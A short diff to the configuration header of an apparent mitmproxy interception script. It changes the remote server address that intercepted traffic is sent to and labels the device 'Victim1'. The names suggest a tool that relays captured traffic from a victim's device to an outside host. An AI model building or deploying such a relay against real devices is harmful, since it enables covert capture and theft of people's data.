@@ -3,7 +3,7 @@ import requests
 from mitmproxy import http
 
 # Configuration
-SERVER_URL = "http://20.2.35.10:9090/intercepted" # Web Server
+SERVER_URL = "http://18.140.67.178:9090/intercepted" # Web Server
 #SERVER_URL = "http://127.0.0.1:9090/intercepted" # localhost
 DEVICE_ID = "Victim1"
 
